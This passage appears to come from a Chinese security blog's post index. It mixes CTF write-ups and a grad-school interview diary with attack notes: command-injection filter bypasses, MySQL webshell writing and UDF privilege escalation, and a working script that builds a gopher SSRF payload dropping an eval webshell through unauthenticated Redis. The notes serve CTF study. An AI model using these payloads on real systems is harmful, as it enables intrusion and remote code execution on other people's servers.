closea=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC 响应包如下图： 总结好久没刷web了，太菜了，这道题一开始没思路，看着师傅们的wp复现出来的，踩坑踩了大概一个小时。","categories":[],"tags":[]},{"title":"山东省网络技术大赛-网络安全赛道初赛第二场wp","slug":"山东省网络技术大赛-网络安全赛道初赛第二场wp","date":"2020-10-19T04:10:22.000Z","updated":"2020-10-19T04:10:38.000Z","comments":true,"path":"2020/10/19/山东省网络技术大赛-网络安全赛道初赛第二场wp/","link":"","permalink":"https://polosec.github.io/2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/","excerpt":"","text":"写在前面组委会太逆天了，pwn环境挂了，群里没人理的 web进入首页有个提示，查看源码后psw.php 1234567891011121314151617181920212223242526&lt;?php highlight_file( __FILE__ ); function encode($string,$option=&#x27;encode&#x27;)&#123; if ($option==&#x27;encode&#x27;) &#123; $lenght=strlen($string); for ($x=0;$x&lt;$lenght;$x++) &#123; @$tmp=substr($string,$x,1); $ord=ord($tmp)+10; @$result=$result.chr($ord); &#125; echo $result.&#x27;&lt;/br&gt;&#x27;; &#125;elseif($option==&#x27;decode&#x27;)&#123; &#125; &#125; encode(&#x27;_Y^kdg_k&#x27;,&#x27;decode&#x27;); ?&gt; 把这段代码放到本地用phpstudy跑起来，最后调用时decode换成encode，跑出来个密码，为ichunqiu，输入到首页即可获得flag misc一张图片，直接stegsolve 往右点，有一张二维码 扫下来base32解密即可得到flag。","categories":[],"tags":[]},{"title":"网络安全专业-夏令营/预推免面经","slug":"面经","date":"2020-10-11T16:34:55.000Z","updated":"2021-01-26T10:02:17.000Z","comments":true,"path":"2020/10/12/面经/","link":"","permalink":"https://polosec.github.io/2020/10/12/%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"写在前面现在是2020年10月12日下午18点19分，我于今天上午收到了来自电子科技大学的录取通知，确定后，意味着保研之旅正式结束。 在这长达一年的准备时间里，感谢父母、家人、学校、学院对我的支持，感谢保研前辈对我的指点，感谢朋友们为我提供信息，加油鼓劲。 夏令营和预推免情况夏令营申请学校：30+所985，211学校，只有山大、中海洋、中央财经、国防科大电子对抗学院通过了初审。 夏令营通过学校：中海洋专硕、国防科大电子对抗学院 网络安全 学硕，其中拒绝了中央财经的面试。 预推免申请学校：山大、天大、电子科大、西北工业大学、哈工大、复旦、西电等。 预推免通过学校：山大网安学硕、天大网安学硕、电子科大网安学硕（其中拒绝了西北工大、西电面试） 最终去向：电子科技大学-计算机学院-网络空间安全-学硕 ，张小松教授团队 ，研究方向：云计算与IOT安全。 个人情况介绍背景简述GPA:4.1/5.0（专业1/49）; CET-4:540; CET-6:548; 一篇国家级普刊，美赛一等奖，蓝桥杯省二，两次校一等奖学金、山东省政府奖学金、数次CTF竞赛经历。 一段专业短期实习经历，两个小项目。（全部专业高度相关） 详细介绍我来自山东省一所一本学校——曲阜师范大学，本科背景通俗地讲叫做“双非”。 我自初中起对网络安全技术感兴趣，一直在断断续续地摸索，大学选择了软件工程专业，算是正式进入计算机行业科班。 大一没有特别认真学习，GPA为3.8/5，暑假有一段香港访学经历，无校级以上奖项。 大一从香港回来后，励志去港校，经咨询后GPA对我来说至少要4以上，于是大二开始每天认真学习专业知识，泡自习室。大二通过了四六级考试，四级540，六级第一次501。拿到了蓝桥杯编程山东省二等奖（水），随师哥去外省参加了两次CTF线下赛（划水），没什么成绩。大二最终GPA为4.01，大二学年GPA为4.32，全年级最高。 大三在师哥的建议下决定尝试保研，于是开始从公众号了解相关政策信息，一开始也是懵懂无知的状态，知道了需要准备简历、项目、竞赛、论文、四六级。 保研准备大三上学期通过了六级考试，在严格的模拟训练下拿到了548分，还算满意。由于疫情原因在家耽误了一段时间，过年那段时间主要在家学保研课，了解如何写个人简历、自我介绍、自我陈述、学校申请等相关流程。 2020年2月份与两位数学的队友一起参加了美国大学生数学建模竞赛，我基本负责除了写论文和建模外的其他内容。（我是辅助），最终拿了国际一等奖的成绩，这与我两位队友的努力是分不开的，致谢。 2020年2月份大致准备好了简历、自我介绍（中英文，长短各一份，共四份）、个人陈述、推荐信、证书证件扫描等文书工作。简历的完善工作一直到最后一次面试前，约四五十次大大小小的修改吧。 2020年三月份成功投稿了我在一月份开始写的一篇期刊，投稿至国家级普刊，期间学习了很多知识。 2020年三月开始正式打CTF、学习CTF知识，写博客。 2020年4月完成了基于flask框架的图书管理系统（一个很小的项目，总共就四五百行代码）四月份开始了解专业前景，向各位前辈以及知乎、交流群里打听专业强校、强老师。 2020年5月完成了基于Nmap和Masscan扫描器的Web扫描器，并改进了CTF-wscan扫描器（主要是优化了多线程与重复扫描问题，当然目前还存在一些bug）。五月份开始联系导师，其中有一位南方学校的老师为我提供了一次宝贵的实习机会。在此向魏老师致谢。 2020年6月在老师的推荐下赴广州进行实习，职位是渗透测试工程师。两个月的实习期间主要是学会了一些思路与工具，收获了一些好友与人脉。期间也在不断地投递简历与联系老师。六月底通过了中海洋、山大的初审。 2020年7月拿到了中海洋优营，国防科大电子对抗学院录取范围第二名，参加电子科技大学导师团队面试并通过，与此同时继续实习。 2020年8月通过了深信服北京安全研发中心实习生两轮技术面，因学校时间冲突原因放弃hr面。 2020年9月通过北京hw蓝队面试，薪资是最低的1.3k一天包吃住（彩笔）、通过了天大复试，拿到了学硕offer 2020年10月通过电子科大、山大复试，拿到本校推免资格，拿到学硕offer并上岸。 劝告保研是一场信息战，但要学会如何获取有用、有价值的信息，学会交朋友，有时候外校朋友的信息能决定你的命运 联系老师很重要，你会发现我所有入营且拿到offer的学校都提前联系了老师。 夏令营面经由于夏令营都在卷，入营非常少，山大是报名的全入营了，没有参考价值。 下面按照时间顺序来说 中国海洋大学 信息学院中海洋第一个面试，我提前联系了老师，老师人很好，在信息学院做安全算是比较好的老师了，邮件联系后，正好老师负责夏令营审批，给了我入营资格。今年中海洋计算机夏令营初审报了四百多，可想而知。 在入营后有一个热身活动，选定一个方向以及问题，对这个问题展开研究并写论文和ppt录屏五分钟内汇报。我选的是系统安全的问题，meltdown，防御方法有KASLR等。 面试前一晚有个机试，据说机试不算成绩里面，但是面试官会有机试的成绩。大概题目都是些比较简单的格式输入输出，算平均分之类的，最后一个是类似矩阵转置输出。。没写上来草。 面试大概是上来先抽题 我抽到了简述计算机网络OSI七层模型，然后就是老师提问，问我极限编程的概念。。。不会；问我MIPS了解多少。。。不会；问我ACID ，说了AID忘了C的含义是啥了。。。尴尬；最后等了一周给了专硕。 山东大学 网络空间安全学院SDU网安是我比较想去的一个学校，有想跟的老师，可惜那位老师不要我，当然，还有一位想跟的老师，那位老师人很好，我也提前和他联系了。 夏令营山大网安面试120个人收17个优营，包括6个左右的本校.. 面试当天问我对密码学有多少了解，我说了解过对称、非对称加密，在蚁剑加密流量分析中用过。然后问我了解过哪些系统安全方面的漏洞，我说meltdown，我说本科主要是做web方向，老师说希望我以后多了解系统安全的知识。（其他细节记不太清了 夏令营印象不是太深刻） 最后优营当然没我啥事 国防科技大学 电子对抗学院NUDT电抗我先联系了一位教授，如沐春风的感觉，给人一种和蔼可亲的感觉，在和地方生学长交流的时候得知该老师水平很高，要求严格，不缺学生，我也很荣幸他能相中我。 在面试的时候设备问题，一直吱吱啦啦对面听不清，进行英文自我介绍的时候被迫叫停。后面简单问了问项目、实习和美赛经历，重点问了美赛里面我承担的工作，并问了主要是谁翻译的。 最后考核结果夏令营录取名额网安为10个，我排第二，免预推免复试。 中央财经大学 信息学院没去面试 西北工业大学 网络空间安全学院没去面试 预推免面经预推免的bar明显低了不少。 电子科技大学 导师面试电子科技大学在七月下旬提前联系导师，参加了导师团队面试。一共大概三四位老师，首先用中文简单地介绍了自己，问我的项目写了多少行代码，是不是自己写的，问我的扫描器能否在扫描速度很快的情况下扫描完所有目标URL，问ZOOMEYE\\FOFA\\SHODAN等空间测绘引擎的区别是什么（主要看着简历问），问了问我美赛的获奖比例以及负责的工作。最后问了我校是否985211，数小时后被通知通过团队面试，经过学院面试后可直接报老师。 天津大学 智能与计算学部天大我先联系了一位老师，这位老师的研究方向和我非常符合，老师也很明确地想要我，但是夏令营卡985211，所以我没进去，等预推免才进去的。 面试首先是一分钟的英文自我介绍，介绍过后讲一下自己准备的PPT（可以中文再介绍一下）然后讲一个你认为最重要的项目（我当时听错了，我以为是不限科研经历，只限一个项目，所以我一共讲了三个，面试老师有些不太高兴），最后问了问我的论文是怎么写的，创新点在哪里。结束面试 最后给了网安学硕，非常非常感谢许老师。 山东大学 网络空间安全学院和老师联系过后我觉得去山大专硕还是比较有希望的，于是报了山大的预推免，比较晚，面试在8号。 面试首先是一轮拷问，还是问我美赛负责的工作、问我本科做什么方向，说我本科打web，研究生方向不太一样。然后有个老师用英文让我描述一下我的数据可视化项目，还有一位老师问了KASLR的作用以及原理。。原理没说上来，还是这位老师，问了我的论文创新点在哪里，有没有自己的新东西….一针见血。。果然不一般。 最后想着能有专硕就行了，结果老师帮我递补了学硕，感谢sdu，感谢郭老师。 电子科技大学 计算机科学与工程学院UESTC是我最后一战，非常紧张。 面试首先是三分钟的PPT自我介绍，介绍了学术背景、科研经历、项目经历。 然后是抽题 ，抽到的题是描述算法，如何找出两个stirng的公共字符。 接下来是英文问题，describe a project 和 why choose our school? 都比较简单，老考点了。 下面就开始拷问了，专业知识问了软件测试的四个过程，黑盒测试和白盒测试的区别，因为我本科是软件工程，问我凭什么报信息安全（？）我说我自己本科主动学习相关知识等。 安全开发的经历、这个短期实习你觉得你都收获了什么东西？ 美赛主要负责哪些内容？ 接下来老师问我更偏向纯技术还是部分技术+social，我选择了前者。 最后老师问我目前的主攻方向是什么，我BB了一堆打太极，最后老师又问，我破防了，遂说Web安全/渗透测试。 总结保研既有实力也有运气，祝大家好运。 不能保证好运的前提下请尽量提升自我，因为在面试中不一定会遇到什么问题，请完善简历，务必对简历上的每一个问题都熟悉。 当你觉得晚了的时候开始，恰恰是最早的时候，现在开始，一切不晚。 学会社交，学会问问题，学会和老师沟通交流，决定鸽的时候要尽量尽早，就算不能早鸽也一定提前和老师说明情况，大多数老师会理解。一定处理好和学校的关系，这不仅关乎你，更关乎你的学弟学妹。 联系方式个人VX:ab444o 欢迎师弟师妹交流保研相关问题~","categories":[],"tags":[]},{"title":"解析漏洞小结","slug":"解析漏洞小结","date":"2020-06-20T14:49:06.000Z","updated":"2020-06-20T15:14:07.000Z","comments":true,"path":"2020/06/20/解析漏洞小结/","link":"","permalink":"https://polosec.github.io/2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/","excerpt":"","text":"参考链接:https://www.jianshu.com/p/a1fa305a6b8f IIS5/6解析漏洞目录解析:在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。比如 www.baidu.com/1.asp/1.jpg文件解析:在IIS6.0下，分号后面的不被解析，也就是说6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。http://www.xxx.com/xx.asp;.jpgIIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。 IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.PHP会将 /xx.jpg/xx.php 解析为 php 文件。常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾 Nginx &lt;=0.8.37 解析漏洞00截断在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。 Apache 解析漏洞后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3 则会被解析为php","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"命令执行绕过(ping ping ping)","slug":"ping-ping-ping","date":"2020-06-20T13:14:50.000Z","updated":"2020-06-20T13:37:33.000Z","comments":true,"path":"2020/06/20/ping-ping-ping/","link":"","permalink":"https://polosec.github.io/2020/06/20/ping-ping-ping/","excerpt":"","text":"页面给了个ip，考虑ping命令的命令执行。这里过滤的内容比较多，过滤了空格，而且有些空格绕过方法也用不了。这里绕过空格用的是$IFS$9接下来尝试cat flagflag字段也被过滤了，尝试使用通配符也不行，*也不行，[]符号也被过滤了。接下来尝试base64编码。echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 可行还有一种方法是cat 反引号里面的内容--- 或$() 会引用命令被执行后的结果。?ip=127.0.0.1;cat$IFS$9ls还有一种方法就是拼接：?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php这样也可以绕过。补充空格绕过：{cat,1.txt}关键字过滤绕过：反斜杠 ca\\t、变量代换、编码、 echo xxxx | base64 -d|sh/bash、引号c’a’t命令分隔与执行多条命令1.&amp;&amp; 表示将任务置于后台执行2.&amp;&amp;只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。3.|| 表示管道，上一条命令的输出，作为下一条命令的参数4.||只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。5.；多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"面试问题整理","slug":"面试问题整理","date":"2020-06-19T15:16:01.000Z","updated":"2020-06-20T10:53:47.000Z","comments":true,"path":"2020/06/19/面试问题整理/","link":"","permalink":"https://polosec.github.io/2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/","excerpt":"","text":"本文不间断地记录面试遇到的问题，希望能对自己有个警醒，对后辈有所作用。 MySQL写Webshell的条件1.知道网站绝对路径2.有对网站绝对路径的写权限 select @@basedir;3.没有配置secure_file_priv 或者其为空4.GPC关闭（默认关闭）secure_file_priv已经设置的话，可以通过修改日志文件到网站根目录，然后通过包含的方式写shell流程：首先找到日志存放位置：接下来设置general_log 为on：set global general_log = on;接下来把日志文件修改为网站绝对目录下的某个文件 比如set global general_log_file =’/var/www/html/shell.php’;接下来select 即可记录到日志文件中，在URL中访问日志文件即可。这里需要注意一个问题，如果目标站点数据库访问频繁的话可能日志文件会很大，连shell会很卡，所以拿到该shell后重新再传一个隐蔽点的shell，再把日志文件改回去，关闭日志记录的功能。 mysql常用查询select @@version; 查询数据库版本select @@basedir; 查询MYSQL安装路径select @@plugin_dir ; 查看plugin路径select host, user, password from mysql.user; 查询hash (MySQL &lt;= 5.6 )select host, user, authentication_string from mysql.user; 查询hash (MySQL &gt;= 5.7 )select @@version_compile_os,@@version_compile_machine; 查询当前操作系统 写shell的几种方式Union selectunion select ‘‘ into outfile /var/www/html/shell.php# lines terminated byselect * from phpcmsv9.v9_admin_role where roleid = 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘‘;原理：通过select语句查询的内容写入文件，也就是 1 into outfile ‘C:/wamp64/www/work/webshell.php’ 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。 lines starting by类似lines terminated by fields terminated by利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。 columns terminated by如上同理 sqlmap写webshell类似上述Mysql写webshell，不过更自动化了，使用命令为 mysql -u url –os-shell，要求同上–目录可写，关闭gpc，绝对路径，ban secure_file_priv mysql UDF提权参考链接：https://blog.csdn.net/qq_26406447/article/details/102691188https://www.jianshu.com/p/5b34c1b6dee7什么是UDF？UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。通过动态库方式实现首先通过注入获取mysql账号密码 1234&#x2F;&#x2F;MySQL 5.6 and belowselect host, user, password from mysql.user;&#x2F;&#x2F;MySQL 5.7 and aboveselect host, user, authentication_string from mysql.user; 有列数限制的话就group_concat(c1,c2,c3 separator ‘-‘)拿到密码后去搜一下md5值。。这里默认root root然后远程连接mysql看一下secure_file_priv接下来就把对应mysql版本的dll文件传上去 位数查看命令：show variables like ‘%version_%’；，位数不对使用dll文件的时候会报错！！！一定注意我这里是64位，就传64位的了，传之前需要用sqlmap的dll，但是异或编码，需要解码，解码也在sqlmap里面。python cloak.py -d -i …/64/lib_mysqludf_sys.dll_解码后上传到数据库对应的位置里面去这里我上传出了点问题，太离谱了。我不太会用loadfile，所以把文件通过010editor，转为16进制导出，然后在notepad去掉空格和换行符(匹配’\\r\\n’),然后select unhex(‘data’) into dumpfile ‘path/plugin/udf.dll’接下来，create function sys_eval returns string soname “udf.dll”;之后就可以愉快地在mysql里面使用系统权限执行命令了。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"apache、nginx、iis日志浅析","slug":"日志浅析","date":"2020-06-17T14:18:25.000Z","updated":"2020-06-17T15:49:23.000Z","comments":true,"path":"2020/06/17/日志浅析/","link":"","permalink":"https://polosec.github.io/2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/","excerpt":"","text":"小知识：常见的Linux发行版本：Redhat、Ubuntu、CentOS、SuSE、Gentoo、Debian、Fedora、最近hw面试问到的问题，特地整理一下。 Find命令面试里面问我怎么用find命令找nginx的日志文件（先问的我nginx的日志文件叫啥。。我不知道。。尴尬）然后提示我是.log结尾，然后我就说了find / -name “.log” 没想到害蒙对了… 准确的表述应该是 find /var/log/nginx -name “.log”这里说一下find命令的一些用法。-exec/-ok都是执行命令，不过-ok会先给出提示，让用户确定是否执行。find . -perm 777 -exec ls -l {} ;-perm 是按照权限进行查找比如 find / -perm 777 Linux权限顺便说一下Linux权限问题RWX read-write-execute对应权值为4-2-1所以chmod 777的意思就是说给所有的用户可读可写可执行的权限（危险每个7分别对应User、Group、Other的权限。 Apche、Nginx、IIS日志Apache:centos配置文件：/etc/httpd/conf/httpd.confUbuntu配置文件：/etc/apache2/apache2.conf日志文件的配置在httpd.conf中。apache日志记录了客户端ip、时间、方法、请求资源、status code、content length等信息。Windows平台的日志位置默认在apache/logs/access.log error.log在基于Debian的Linux上(Ubuntu)，系统范围的Apache错误日志默认位置是/var/log/apache2/error.log在基于 Red Hat 的Linux中(centos)，系统范围的 Apache 错误日志文件默认被放置在/var/log/httpd/error_logNginx:Windows：logs/access.logLinux:/var/log/nginx/access.log默认配置文件：/etc/nginx/nginx.confIIS:IIS6 默认情况下 IIS日志文件目录 为 C:\\windows\\system32\\LogFilesIIS7.5 默认情况下IIS日志目录为 “%SystemDrive%\\inetpub\\logs\\LogFiles” 其中%SystemDrive% 表示系统安装位置，一般指 C: 盘，点击“浏览”按钮可自定义存放IIS日志目录。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"浅谈SSRF与redis及其相关问题","slug":"浅谈SSRF与redis及其相关问题","date":"2020-06-13T09:18:38.000Z","updated":"2020-06-13T10:26:14.000Z","comments":true,"path":"2020/06/13/浅谈SSRF与redis及其相关问题/","link":"","permalink":"https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"什么是Redis Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。 Redis漏洞Redis会因为配置不当而产生漏洞。Redis默认监听端口为 0.0.0.0:6379,默认没有设置密码认证，这意味着redis服务器暴漏在公网并且可以被操作。Redis未授权漏洞利用情况有如下几种1.敏感数据泄露2.写shell3.把公钥写入authorized_keys，可以登录主机。（需要Redis以root权限运行）4.contrab反弹shell Redis漏洞利用对于未授权访问的情况，可以获取到Redis服务器ip后在本地远程连接Redis服务器，也可以构造数据包向Redis服务器发送恶意代码。 SSRF与各种协议SSRF全程为 Server-Side-Request-Forgery 服务器端请求伪造，即为通过服务器对内网资源进行一些请求，可以进行文件读取，内网扫描、主机探测、漏洞利用等活动。 Gopher协议Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议gopher协议格式：URL: gopher://:/_UrlEncodedTCPStream file协议curl支持file协议，可以通过file协议LFI。file:///etc/passwd dict协议curl支持dict协议，可以通过dict协议探测服务信息。curl dict://127.0.0.1:22 例题GKCTF-2020 EasyWeb这道题拿到手没啥思路 看到源码提示了secret之后发现是ifconfig然后就使用burp扫一下内网，发现一台173.187.36.11这台服务器的报错是redis的报错。然后爆破扫一下端口，发现是默认的6379。接下来考虑SSRF打内网未授权Redis。EXP: 12345678910111213141516171819202122232425262728293031import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.216.189.11&quot;port=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 替换url和payload即可生成payload为 1gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 然后访问http://redis_ip/shell.php即可getflag 参考链接https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNodehttps://zhuanlan.zhihu.com/p/112055947https://www.freebuf.com/column/158065.htmlhttps://www.freebuf.com/vuls/162035.htmlhttps://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"恶臭数据包","slug":"恶臭数据包","date":"2020-06-06T14:39:48.000Z","updated":"2020-06-06T15:04:29.000Z","comments":true,"path":"2020/06/06/恶臭数据包/","link":"","permalink":"https://polosec.github.io/2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/","excerpt":"","text":"数据包分析下载完数据包之后，protocol全都是802.11，考虑数据包被加密了，接下来进行解密。使用aircrack-ng 对数据包进行解密，使用的字典为fuzzdict wifipwdtop2000。 跑出来wifi密码为12345678，结合SSID对数据包进行解密。 数据包解密首选项-协议-IEEE802.11-编辑decryption keys。type选择wpa-pwd,格式为 wifi密码:SSID也可以从https://www.wireshark.org/tools/wpa-psk.html 根据wifi密码和SSID生成PSK，type选择PSK就好。点击确认后就可以在数据包页面看到解密的分组了。首先过滤http和tcp分组，语法为：http and tcp过滤后发现有上传图片的分组，遂过滤之，取其数据并导出。导出方法：选择分组，在分组详情那选中media type 就可以自动选择媒体数据。 然后右键导出分组字节流就可以导出图片了。 图片分析习惯性地丢到binwalk分析，分离出来一个压缩包，有密码，不是伪加密，考虑从数据包找答案。其实做到这里有点没思路了，看了看解析发现接下来做下去要看session。session是JWT格式，还原地址：https://www.jstoolset.com/jwt还原后：提示压缩包密码是刚才ping过的一个网站，于是搜索icmp协议，但是没有。 柳暗花明去ping域名的话会先进行dns解析，于是过滤dns协议，在最后一个dns协议包里面找到ping的域名，作为压缩包密码填进去，得到flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"流量分析","slug":"流量分析","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"CSP-XSS Bypass","slug":"CSP-XSS-Bypass","date":"2020-06-02T07:25:59.000Z","updated":"2020-06-02T16:09:24.000Z","comments":true,"path":"2020/06/02/CSP-XSS-Bypass/","link":"","permalink":"https://polosec.github.io/2020/06/02/CSP-XSS-Bypass/","excerpt":"","text":"参考链接：https://www.zhihu.com/question/21979782https://xz.aliyun.com/t/5084#toc-2https://www.cnblogs.com/thenbz3/p/11863641.html CSP的概念CSP 是 Content Security Policy 的缩写，即内容安全策略。CSP旨在减少XSS攻击，具体原理是通过设置response header或者在页面中使用meta标签规定受信任的、可执行的JS、图片、iframe、style来源。任何不符合CSP规则的资源都将无法被加载。 CSP示例12Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https: 资源限制类型（引用）：script-src：外部脚本 指定了允许从哪里加载JS脚本style-src：样式表img-src：图像media-src：媒体文件（音频和视频）font-src：字体文件object-src：插件（比如 Flash）child-src：框架frame-ancestors：嵌入的外部资源connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）worker-src：worker脚本manifest-src：manifest 文件default-src ‘self’ 该属性值为self时只允许本站资源加载。设置了这个就为上述属性设置了默认值‘self’上述属性如果不明确指定的话则默认范围是*，即允许所有。script-src属性里面 设置unsafe-inline 允许内嵌的脚本及样式 不写这个默认不允许。script-src属性里面 